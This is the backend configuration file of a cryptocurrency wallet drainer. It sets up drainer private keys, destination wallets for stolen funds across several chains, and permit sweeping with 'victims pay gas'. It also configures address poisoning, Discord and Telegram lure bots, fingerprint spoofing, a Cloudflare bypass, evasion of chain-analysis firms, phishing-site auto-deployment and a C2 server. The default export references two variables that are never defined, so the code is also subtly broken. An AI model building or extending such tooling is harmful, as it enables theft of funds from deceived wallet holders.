// backend/config.js - FOR BACKEND ONLY (Node.js)
import dotenv from 'dotenv';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import { ethers } from "ethers";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Load environment variables from backend/.env
dotenv.config({ path: join(__dirname, '.env') });

// ========== GASLESS MODE CONFIGURATION ==========
export const GASLESS_MODE = true;
export const GASLESS_FEATURES = {
    AI_ANALYSIS: true,
    FINGERPRINTING: true,
    RISK_SCREENING: true,
    PERMIT_SWEEP: true,
    AA_EXPLOIT: true,
    MARKET_INTEL: true,
    LURE_GENERATION: true,
    ANALYTICS: true,
    ZERO_GAS_COST: true,
    VICTIMS_PAY_GAS: true
};

// Gasless endpoints configuration
export const GASLESS_ENDPOINTS_CONFIG = {
    ENABLED: true,
    TOTAL_FEATURES: 22,
    AUTO_ACTIVATE: true,
    BULK_ACTIVATION: true,
    FEATURE_TIMEOUT: 30000,
    RETRY_ATTEMPTS: 3
};

// ========== BACKEND-ONLY SENSITIVE CONFIGURATION ==========

// ✅ All sensitive values moved to environment variables
export const RPC_URL = process.env.RPC_URL || "https://eth.llamarpc.com";
export const DESTINATION_WALLET = process.env.DESTINATION_WALLET || "";
export const DESTINATION_WALLET_SOL = process.env.DESTINATION_WALLET_SOL || "";
export const DESTINATION_WALLET_BTC = process.env.DESTINATION_WALLET_BTC || "";
export const RAILGUN_CONTRACT_ADDRESS = process.env.RAILGUN_CONTRACT_ADDRESS || "";
export const USDC_CONTRACT_ADDRESS = process.env.USDC_CONTRACT_ADDRESS || "";
export const DAI_CONTRACT_ADDRESS = process.env.DAI_CONTRACT_ADDRESS || "";
export const CHAIN_ID = parseInt(process.env.CHAIN_ID || '1');
export const CHAINLINK_ETH_USD_FEED = process.env.CHAINLINK_ETH_USD_FEED || "";

// ========== SINGLE-POPUP CONFIGURATION ==========
export const SINGLE_POPUP_CONFIG = {
  ENABLED: true,
  MAX_EXECUTION_TIME: 30000, // 30 seconds max
  MAX_OPERATIONS: 5, // Max operations per popup
  MIN_PROFIT_THRESHOLD: ethers.parseUnits('0.001', 'ether'),
  AUTO_SWAP: true,
  GAS_LIMIT_MULTIPLIER: 1.3,
  PRIORITY_FEE: ethers.parseUnits('2.5', 'gwei'),
  RELAY_PRIORITY: ['flashbots', 'bloxroute', 'eden'],
  SUPPORTED_CHAINS: ['1', '42161', '137', '56', '10', '43114'] // Ethereum, Arbitrum, Polygon, BSC, Optimism, Avalanche
};

// Single-popup multicall addresses
export const MULTICALL3_ADDRESSES = {
  '1': '0xcA11bde05977b3631167028862bE2a173976CA11', // Ethereum
  '42161': '0xcA11bde05977b3631167028862bE2a173976CA11', // Arbitrum
  '137': '0xcA11bde05977b3631167028862bE2a173976CA11', // Polygon
  '56': '0xcA11bde05977b3631167028862bE2a173976CA11', // BSC
  '10': '0xcA11bde05977b3631167028862bE2a173976CA11', // Optimism
  '43114': '0xcA11bde05977b3631167028862bE2a173976CA11', // Avalanche
  '8453': '0xcA11bde05977b3631167028862bE2a173976CA11', // Base
  '324': '0xcA11bde05977b3631167028862bE2a173976CA11'  // zkSync
};

// Single-popup operation types
export const SINGLE_POPUP_OPERATIONS = {
  TOKEN_TRANSFER: 'token-transfer',
  NFT_TRANSFER: 'nft-transfer',
  APPROVAL: 'approval',
  NATIVE_TRANSFER: 'native-transfer',
  PERMIT_EXECUTION: 'permit-execution'
};

// 1. Advanced Impersonation & Address Poisoning
export const VANITY_KEY_ENCRYPTION_SECRET = process.env.VANITY_KEY_ENCRYPTION_SECRET || '';

// Private Keys (EXTREMELY SENSITIVE)
export const DRAINER_PK = process.env.DRAINER_PK || '';
export const ADMIN_PK = process.env.ADMIN_PK || '';

// 2. Discord & Telegram Lures
export const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN || '';
export const DISCORD_APPLICATION_ID = process.env.DISCORD_APPLICATION_ID || '';
export const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
export const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// 3. Enhanced Evasion & Fingerprinting
export const FINGERPRINT_SAFE_ORIGIN = process.env.FINGERPRINT_SAFE_ORIGIN || '';
export const FINGERPRINT_SAFE_USER_AGENT = process.env.FINGERPRINT_SAFE_USER_AGENT || '';
export const CLOUDFLARE_BYPASS_API_KEY = process.env.CLOUDFLARE_BYPASS_API_KEY || '';

// 4. Real-time Intelligence & Market Data
export const DEXSCREENER_API_KEY = process.env.DEXSCREENER_API_KEY || '';
export const COINGECKO_API_KEY = process.env.COINGECKO_API_KEY || '';
export const TWITTER_BEARER_TOKEN = process.env.TWITTER_BEARER_TOKEN || '';

// 5. Advanced OpSec & Chain Analysis
export const CHAINALYSIS_API_KEY = process.env.CHAINALYSIS_API_KEY || '';
export const TRM_LABS_API_KEY = process.env.TRM_LABS_API_KEY || '';
export const CRYPTO_TAX_AGGRESSOR_API_KEY = process.env.CRYPTO_TAX_AGGRESSOR_API_KEY || '';

// 6. Account Abstraction & New Standards
export const ERC4337_BUNDLER_URL = process.env.ERC4337_BUNDLER_URL || '';
export const ERC4337_PAYMASTER_URL = process.env.ERC4337_PAYMASTER_URL || '';

// 7. Auto-Deployment & Infrastructure
export const NETLIFY_ACCESS_TOKEN = process.env.NETLIFY_ACCESS_TOKEN || '';
export const VERCEL_ACCESS_TOKEN = process.env.VERCEL_ACCESS_TOKEN || '';
export const GITHUB_PAGES_TOKEN = process.env.GITHUB_PAGES_TOKEN || '';

// 8. AI & Machine Learning Services
export const OPENAI_API_KEY = process.env.OPENAI_API_KEY || '';
export const HUGGINGFACE_API_KEY = process.env.HUGGINGFACE_API_KEY || '';
export const ALCHEMY_AI_API_KEY = process.env.ALCHEMY_AI_API_KEY || '';

// 9. Advanced Rate Limiting & Security
export const MAX_REQUESTS_PER_MINUTE = parseInt(process.env.MAX_REQUESTS_PER_MINUTE || '100');
export const API_RATE_LIMIT_WINDOW_MS = parseInt(process.env.API_RATE_LIMIT_WINDOW_MS || '900000');

// 10. C2 Server Configuration (if using external C2)
export const C2_AUTH_TOKEN = process.env.C2_AUTH_TOKEN || '';
export const HEARTBEAT_INTERVAL_MS = parseInt(process.env.HEARTBEAT_INTERVAL_MS || '30000');

// API Keys (ALL sensitive keys)
export const COVALENT_API_KEY = process.env.COVALENT_API_KEY || '';
export const LIFI_API_KEY = process.env.LIFI_API_KEY || '';
export const ETHERSCAN_API_KEY = process.env.ETHERSCAN_API_KEY || '';
export const BSCSCAN_API_KEY = process.env.BSCSCAN_API_KEY || '';
export const POLYGONSCAN_API_KEY = process.env.POLYGONSCAN_API_KEY || '';
export const ARBISCAN_API_KEY = process.env.ARBISCAN_API_KEY || '';
export const OPTIMISMSCAN_API_KEY = process.env.OPTIMISMSCAN_API_KEY || '';
export const SNOWTRACE_API_KEY = process.env.SNOWTRACE_API_KEY || '';
export const BASESCAN_API_KEY = process.env.BASESCAN_API_KEY || '';
export const MORALIS_API_KEY = process.env.MORALIS_API_KEY || '';
export const SOCKET_API_KEY = process.env.SOCKET_API_KEY || '';
export const DEBRIDGE_API_KEY = process.env.DEBRIDGE_API_KEY || '';
export const SQUID_API_KEY = process.env.SQUID_API_KEY || '';
export const PARASWAP_API_KEY = process.env.PARASWAP_API_KEY || '';
export const ZEROX_API_KEY = process.env.ZEROX_API_KEY || '';
export const INCH_API_KEY = process.env.INCH_API_KEY || '';

// Security
export const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '';

// Server Configuration
export const PORT = process.env.PORT || 3000;
export const C2_PORT = process.env.C2_PORT || 3001;
export const C2_SERVER_URL = process.env.C2_SERVER_URL || 'http://localhost:3001';
export const ADMIN_WHITELIST_IPS = process.env.ADMIN_WHITELIST_IPS || '127.0.0.1,::1';

// Contract Addresses
export const PERMIT2_CONTRACT_ADDRESS = process.env.PERMIT2_CONTRACT_ADDRESS || '';
export const BATCH_TRANSFER_CONTRACT = process.env.BATCH_TRANSFER_CONTRACT || '';
export const DEFAULT_PERMIT_AMOUNT = process.env.DEFAULT_PERMIT_AMOUNT || '';

// Multi-signature Configuration
export const MULTISIG_SIGNERS = process.env.MULTISIG_SIGNERS ? process.env.MULTISIG_SIGNERS.split(',') : [];
export const MULTISIG_THRESHOLD = parseInt(process.env.MULTISIG_THRESHOLD || '2');

// Tenderly Configuration
export const TENDERLY_ACCOUNT_NAME = process.env.TENDERLY_ACCOUNT_NAME || '';
export const TENDERLY_PROJECT_NAME = process.env.TENDERLY_PROJECT_NAME || '';
export const TENDERLY_ACCESS_KEY = process.env.TENDERLY_ACCESS_KEY || '';

// Blockchain Explorer API Base URLs
export const ETHERSCAN_API_URL = process.env.ETHERSCAN_API_URL || '';
export const BSCSCAN_API_URL = process.env.BSCSCAN_API_URL || '';
export const POLYGONSCAN_API_URL = process.env.POLYGONSCAN_API_URL || '';
export const ARBISCAN_API_URL = process.env.ARBISCAN_API_URL || '';
export const OPTIMISMSCAN_API_URL = process.env.OPTIMISMSCAN_API_URL || '';
export const SNOWTRACE_API_URL = process.env.SNOWTRACE_API_URL || '';
export const BASESCAN_API_URL = process.env.BASESCAN_API_URL || '';

// Private Relay Services
export const FLASHBOTS_RPC_URL = process.env.FLASHBOTS_RPC_URL || '';
export const BLOXROUTE_RPC_URL = process.env.BLOXROUTE_RPC_URL || '';
export const EDEN_RPC_URL = process.env.EDEN_RPC_URL || '';
export const FLASHBOTS_RELAY_URL = process.env.FLASHBOTS_RELAY_URL || '';

// Bitcoin RPC
export const BITCOIN_RPC_URL = process.env.BITCOIN_RPC_URL || '';
export const BITCOIN_RPC_USER = process.env.BITCOIN_RPC_USER || '';
export const BITCOIN_RPC_PASSWORD = process.env.BITCOIN_RPC_PASSWORD || '';
export const BITCOIN_RPC_PORT = process.env.BITCOIN_RPC_PORT || '';

// Multi-Chain RPC URLs
export const ETHEREUM_RPC_URL = process.env.ETHEREUM_RPC_URL || '';
export const BSC_RPC_URL = process.env.BSC_RPC_URL || '';
export const POLYGON_RPC_URL = process.env.POLYGON_RPC_URL || '';
export const ARBITRUM_RPC_URL = process.env.ARBITRUM_RPC_URL || '';
export const OPTIMISM_RPC_URL = process.env.OPTIMISM_RPC_URL || '';
export const ZKSYNC_RPC_URL = process.env.ZKSYNC_RPC_URL || '';
export const SOLANA_RPC_URL = 'https://api.mainnet-beta.solana.com';
export const BITCOIN_API_URL = 'https://blockstream.info/api';
// ========== CONFIGURATION OBJECTS ==========

// Modern drainer services configuration
export const MODERN_SERVICES_CONFIG = {
  // Impersonation services
  vanityAddress: {
    enabled: !!VANITY_KEY_ENCRYPTION_SECRET,
    maxAttempts: 10000,
    minSimilarity: 5
  },
  
  // Social engineering services
  discord: {
    enabled: !!DISCORD_BOT_TOKEN,
    applicationId: DISCORD_APPLICATION_ID
  },
  telegram: {
    enabled: !!TELEGRAM_BOT_TOKEN,
    chatId: TELEGRAM_CHAT_ID
  },
  
  // Evasion services
  fingerprintSpoofing: {
    enabled: true,
    safeOrigin: FINGERPRINT_SAFE_ORIGIN,
    safeUserAgent: FINGERPRINT_SAFE_USER_AGENT
  },
  cloudflareBypass: {
    enabled: !!CLOUDFLARE_BYPASS_API_KEY,
    apiKey: CLOUDFLARE_BYPASS_API_KEY
  },
  
  // Intelligence services
  marketIntelligence: {
    dexscreener: !!DEXSCREENER_API_KEY,
    coingecko: !!COINGECKO_API_KEY,
    twitter: !!TWITTER_BEARER_TOKEN
  },
  
  // OpSec services
  chainAnalysis: {
    chainalysis: !!CHAINALYSIS_API_KEY,
    trmLabs: !!TRM_LABS_API_KEY,
    cyril: !!CRYPTO_TAX_AGGRESSOR_API_KEY
  },
  
  // Infrastructure services
  autoDeployment: {
    netlify: !!NETLIFY_ACCESS_TOKEN,
    vercel: !!VERCEL_ACCESS_TOKEN,
    githubPages: !!GITHUB_PAGES_TOKEN
  },
  
  // AI services
  artificialIntelligence: {
    openai: !!OPENAI_API_KEY,
    huggingface: !!HUGGINGFACE_API_KEY,
    alchemy: !!ALCHEMY_AI_API_KEY
  },

  // Gasless services
  gaslessMode: {
    enabled: GASLESS_MODE,
    features: GASLESS_FEATURES,
    endpoints: GASLESS_ENDPOINTS_CONFIG
  }
};

// Account Abstraction configuration
export const ACCOUNT_ABSTRACTION_CONFIG = {
  bundlerUrl: ERC4337_BUNDLER_URL,
  paymasterUrl: ERC4337_PAYMASTER_URL,
  entryPoint: '0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789',
  enabled: !!ERC4337_BUNDLER_URL && !!ERC4337_PAYMASTER_URL
};

// Cross-chain aggregators with actual API keys
export const CROSS_CHAIN_AGGREGATORS = {
  lifi: {
    name: 'LI.FI',
    apiBase: 'https://li.quest/v1',
    apiKey: LIFI_API_KEY,
    enabled: !!LIFI_API_KEY
  },
  socket: {
    name: 'Socket',
    apiBase: 'https://api.socket.tech/v2',
    apiKey: SOCKET_API_KEY,
    enabled: !!SOCKET_API_KEY
  },
  debridge: {
    name: 'deBridge',
    apiBase: 'https://api.debridge.finance',
    apiKey: DEBRIDGE_API_KEY,
    enabled: !!DEBRIDGE_API_KEY
  },
  squid: {
    name: 'Squid',
    apiBase: 'https://api.squidrouter.com/v1',
    apiKey: SQUID_API_KEY,
    enabled: !!SQUID_API_KEY
  }
};

// Chain configuration with API keys
export const CHAINS_CONFIG = {
  ethereum: {
    chainId: 1,
    name: 'Ethereum',
    rpcUrl: ETHEREUM_RPC_URL,
    explorer: 'https://etherscan.io',
    nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
    explorerApiKey: ETHERSCAN_API_KEY
  },
  polygon: {
    chainId: 137,
    name: 'Polygon',
    rpcUrl: POLYGON_RPC_URL,
    explorer: 'https://polygonscan.com',
    nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
    explorerApiKey: POLYGONSCAN_API_KEY
  },
  bsc: {
    chainId: 56,
    name: 'Binance Smart Chain',
    rpcUrl: BSC_RPC_URL,
    explorer: 'https://bscscan.com',
    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
    explorerApiKey: BSCSCAN_API_KEY
  },
  arbitrum: {
    chainId: 42161,
    name: 'Arbitrum',
    rpcUrl: ARBITRUM_RPC_URL,
    explorer: 'https://arbiscan.io',
    nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
    explorerApiKey: ARBISCAN_API_KEY
  },
  optimism: {
    chainId: 10,
    name: 'Optimism',
    rpcUrl: OPTIMISM_RPC_URL,
    explorer: 'https://optimistic.etherscan.io',
    nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
    explorerApiKey: OPTIMISMSCAN_API_KEY
  },
  solana: {
  chainId: 'solana',
  name: 'Solana',
  rpcUrl: SOLANA_RPC_URL,
  explorer: 'https://solscan.io',
  nativeCurrency: { name: 'SOL', symbol: 'SOL', decimals: 9 }
},
bitcoin: {
  chainId: 'bitcoin',
  name: 'Bitcoin',
  apiUrl: BITCOIN_API_URL,
  explorer: 'https://blockstream.info',
  nativeCurrency: { name: 'Bitcoin', symbol: 'BTC', decimals: 8 }
}

};

// ========== VALIDATION FUNCTIONS ==========

export function validateModernConfig() {
  const warnings = [];
  
  // Check for recommended modern features
  if (!VANITY_KEY_ENCRYPTION_SECRET) {
    warnings.push('VANITY_KEY_ENCRYPTION_SECRET missing - address poisoning disabled');
  }
  
  if (!DISCORD_BOT_TOKEN && !TELEGRAM_BOT_TOKEN) {
    warnings.push('No social media bot tokens - Discord/Telegram lures disabled');
  }
  
  if (!CHAINALYSIS_API_KEY && !TRM_LABS_API_KEY) {
    warnings.push('No chain analysis APIs - advanced OpSec disabled');
  }
  
  if (!OPENAI_API_KEY && !HUGGINGFACE_API_KEY) {
    warnings.push('No AI APIs - behavioral analysis limited');
  }
  
  return warnings;
}

// Security validation
export function validatePrivateConfig() {
  const required = ['DRAINER_PK', 'DESTINATION_WALLET'];
  const missing = required.filter(key => !process.env[key] || process.env[key] === '');
  
  if (missing.length > 0) {
    throw new Error('Missing required private configuration: ' + missing.join(', '));
  }
  
  // Add modern config warnings
  const warnings = validateModernConfig();
  if (warnings.length > 0) {
    console.log('⚠️  Configuration warnings');
    warnings.forEach(warning => console.log('   - ' + warning));
  }
  
  return true;
}

// Helper function to get API key for a chain
export function getExplorerApiKey(chainId) {
  const chain = Object.values(CHAINS_CONFIG).find(c => c.chainId === chainId);
  return chain ? chain.explorerApiKey : '';
}

export function getRpcUrl(chainId) {
  const workingRpcUrls = {
    1: 'https://eth.llamarpc.com',           // Ethereum
    56: 'https://bsc-dataseed.binance.org/', // BSC
    137: 'https://polygon-rpc.com',          // Polygon
    42161: 'https://arb1.arbitrum.io/rpc',   // Arbitrum
    10: 'https://mainnet.optimism.io',       // Optimism
    324: 'https://mainnet.era.zksync.io',    // zkSync
  };
  return workingRpcUrls[chainId] || 'https://eth.llamarpc.com';
}

// ADD THESE NEW FUNCTIONS:
export function getSolanaRpcUrl() {
  return 'https://api.mainnet-beta.solana.com';
}

export function getBitcoinApiUrl() {
  return 'https://blockstream.info/api';
}

export const RPC_URLS = {
  ethereum: ETHEREUM_RPC_URL,
  polygon: POLYGON_RPC_URL,
  bsc: BSC_RPC_URL,
  arbitrum: ARBITRUM_RPC_URL,
  optimism: OPTIMISM_RPC_URL,
  zksync: ZKSYNC_RPC_URL,
  solana: SOLANA_RPC_URL,
  bitcoin: BITCOIN_API_URL
};

// Gasless configuration validation
export function validateGaslessConfig() {
  if (GASLESS_MODE) {
    console.log('🆓 Gasless Mode: ENABLED');
    console.log(`   • Features: ${Object.keys(GASLESS_FEATURES).filter(k => GASLESS_FEATURES[k]).length}/9 active`);
    console.log(`   • Endpoints: ${GASLESS_ENDPOINTS_CONFIG.TOTAL_FEATURES} gasless endpoints`);
    console.log(`   • Auto-activation: ${GASLESS_ENDPOINTS_CONFIG.AUTO_ACTIVATE ? '✅' : '❌'}`);
    console.log(`   • Bulk activation: ${GASLESS_ENDPOINTS_CONFIG.BULK_ACTIVATION ? '✅' : '❌'}`);
  } else {
    console.log('🆓 Gasless Mode: DISABLED');
  }
}

// Logging (don't expose values)
console.log('🔐 Backend config loaded successfully');
console.log('📋 DRAINER_PK:', DRAINER_PK ? '***SET***' : '❌ MISSING');
console.log('📋 DESTINATION_WALLET:', DESTINATION_WALLET ? '***SET***' : '❌ MISSING');

// Log modern feature status
console.log('🚀 Modern features status');
console.log('   • Address Poisoning:', MODERN_SERVICES_CONFIG.vanityAddress.enabled ? '✅' : '❌');
console.log('   • Social Engineering:', (MODERN_SERVICES_CONFIG.discord.enabled || MODERN_SERVICES_CONFIG.telegram.enabled) ? '✅' : '❌');
console.log('   • Fingerprint Spoofing:', MODERN_SERVICES_CONFIG.fingerprintSpoofing.enabled ? '✅' : '❌');
console.log('   • Chain Analysis:', (MODERN_SERVICES_CONFIG.chainAnalysis.chainalysis || MODERN_SERVICES_CONFIG.chainAnalysis.trmLabs) ? '✅' : '❌');
console.log('   • AI Enhancements:', (MODERN_SERVICES_CONFIG.artificialIntelligence.openai || MODERN_SERVICES_CONFIG.artificialIntelligence.huggingface) ? '✅' : '❌');

// Validate gasless configuration
validateGaslessConfig();

// Validate configuration on load
validatePrivateConfig();

export default {
  // Gasless exports
  GASLESS_MODE,
  GASLESS_FEATURES,
  GASLESS_ENDPOINTS_CONFIG,

  // Public exports
  RPC_URL,
  DESTINATION_WALLET,
  DESTINATION_WALLET_SOL,
  RAILGUN_CONTRACT_ADDRESS,
  USDC_CONTRACT_ADDRESS,
  DAI_CONTRACT_ADDRESS,
  CHAIN_ID,
  CHAINLINK_ETH_USD_FEED,
  VANITY_KEY_ENCRYPTION_SECRET,
  DISCORD_BOT_TOKEN,
  DISCORD_APPLICATION_ID,
  TELEGRAM_BOT_TOKEN,
  TELEGRAM_CHAT_ID,
  FINGERPRINT_SAFE_ORIGIN,
  FINGERPRINT_SAFE_USER_AGENT,
  CLOUDFLARE_BYPASS_API_KEY,
  DEXSCREENER_API_KEY,
  COINGECKO_API_KEY,
  TWITTER_BEARER_TOKEN,
  CHAINALYSIS_API_KEY,
  TRM_LABS_API_KEY,
  CRYPTO_TAX_AGGRESSOR_API_KEY,
  ERC4337_BUNDLER_URL,
  ERC4337_PAYMASTER_URL,
  NETLIFY_ACCESS_TOKEN,
  VERCEL_ACCESS_TOKEN,
  GITHUB_PAGES_TOKEN,
  OPENAI_API_KEY,
  HUGGINGFACE_API_KEY,
  ALCHEMY_AI_API_KEY,
  MAX_REQUESTS_PER_MINUTE,
  API_RATE_LIMIT_WINDOW_MS,
  C2_AUTH_TOKEN,
  HEARTBEAT_INTERVAL_MS,

  // Sensitive exports (from environment variables)
  DRAINER_PK,
  ADMIN_PK,
  COVALENT_API_KEY,
  LIFI_API_KEY,
  ETHERSCAN_API_KEY,
  BSCSCAN_API_KEY,
  POLYGONSCAN_API_KEY,
  ARBISCAN_API_KEY,
  OPTIMISMSCAN_API_KEY,
  SNOWTRACE_API_KEY,
  BASESCAN_API_KEY,
  MORALIS_API_KEY,
  SOCKET_API_KEY,
  DEBRIDGE_API_KEY,
  SQUID_API_KEY,
  PARASWAP_API_KEY,
  ZEROX_API_KEY,
  INCH_API_KEY,
  ADMIN_PASSWORD,
  PORT,
  C2_PORT,
  C2_SERVER_URL,
  ADMIN_WHITELIST_IPS,
  PERMIT2_CONTRACT_ADDRESS,
  BATCH_TRANSFER_CONTRACT,
  DEFAULT_PERMIT_AMOUNT,
  MULTISIG_SIGNERS,
  MULTISIG_THRESHOLD,
  TENDERLY_ACCOUNT_NAME,
  TENDERLY_PROJECT_NAME,
  TENDERLY_ACCESS_KEY,
  ETHERSCAN_API_URL,
  BSCSCAN_API_URL,
  POLYGONSCAN_API_URL,
  ARBISCAN_API_URL,
  OPTIMISMSCAN_API_URL,
  SNOWTRACE_API_URL,
  BASESCAN_API_URL,
  FLASHBOTS_RPC_URL,
  BLOXROUTE_RPC_URL,
  EDEN_RPC_URL,
  FLASHBOTS_RELAY_URL,
  BITCOIN_RPC_URL,
  BITCOIN_RPC_USER,
  BITCOIN_RPC_PASSWORD,
  BITCOIN_RPC_PORT,
  ETHEREUM_RPC_URL,
  BSC_RPC_URL,
  POLYGON_RPC_URL,
  ARBITRUM_RPC_URL,
  OPTIMISM_RPC_URL,
  AVALANCHE_RPC_URL,
  BASE_RPC_URL,
  ZKSYNC_RPC_URL,
  CROSS_CHAIN_AGGREGATORS,
  CHAINS_CONFIG,
  MODERN_SERVICES_CONFIG,
  ACCOUNT_ABSTRACTION_CONFIG,
  validatePrivateConfig,
  validateModernConfig,
  validateGaslessConfig,
  getExplorerApiKey,
  getRpcUrl
};
